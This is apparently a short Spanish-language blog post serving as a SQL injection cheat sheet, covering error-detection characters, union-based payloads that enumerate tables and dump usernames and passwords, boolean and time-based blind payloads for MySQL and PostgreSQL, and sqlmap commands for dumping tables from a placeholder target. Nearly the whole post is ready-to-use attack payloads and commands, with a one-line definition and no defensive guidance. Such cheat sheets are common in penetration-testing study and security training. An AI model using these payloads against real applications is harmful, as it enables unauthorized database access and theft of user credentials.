---
layout: post
title: "SQL Injection — Union, Blind y Time-based"
date: 2025-01-20
categories: [ciberseguridad]
tags: [web, sqli, owasp, hacking, sqlmap]
description: "Técnicas de inyección SQL: Union-based, Blind, Time-based y automatización con sqlmap."
---

## ¿Qué es SQL Injection?

Vulnerabilidad que permite interferir con las consultas que una aplicación hace a su base de datos. OWASP Top 10.

## Detección básica

```sql
'
''
')
'))
```

## Union-based SQLi

```sql
-- Número de columnas
' ORDER BY 3--

-- Columna visible
' UNION SELECT NULL,NULL,NULL--

-- Extraer base de datos
' UNION SELECT database(),NULL,NULL--

-- Listar tablas
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--

-- Dump usuarios
' UNION SELECT username,password,NULL FROM users--
```

## Blind SQLi — Boolean

```sql
' AND 1=1--   -- verdadero
' AND 1=2--   -- falso

-- Extraer carácter a carácter
' AND SUBSTRING(username,1,1)='a'--
```

## Time-based Blind

```bash
# MySQL
' AND SLEEP(5)--

# PostgreSQL
'; SELECT pg_sleep(5)--
```

## sqlmap

```bash
# Básico
sqlmap -u "http://target.com/page?id=1" --dbs

# Con cookie de sesión
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc" --dbs

# Dump de tabla
sqlmap -u "http://target.com/page?id=1" -D db -T users --dump

# Desde Burp request
sqlmap -r request.txt --level=5 --risk=3
```
